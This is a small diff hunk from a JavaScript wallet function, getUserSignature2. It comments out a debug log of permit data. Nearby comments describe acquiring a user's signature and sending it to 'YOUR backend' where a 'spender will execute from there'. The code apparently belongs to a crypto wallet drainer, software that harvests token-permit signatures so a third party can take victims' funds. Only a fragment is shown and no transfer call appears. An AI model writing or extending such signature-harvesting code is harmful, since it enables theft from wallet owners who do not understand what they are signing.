@@ -890,7 +890,7 @@ export async function getUserSignature2(walletClient, address) {
     })
     
 
-    console.log(permitData)
+    //console.log(permitData)
     console.log('Signature acquired, sending to backend...')
 
     // STEP 6: Send signature to YOUR backend — spender will execute from there
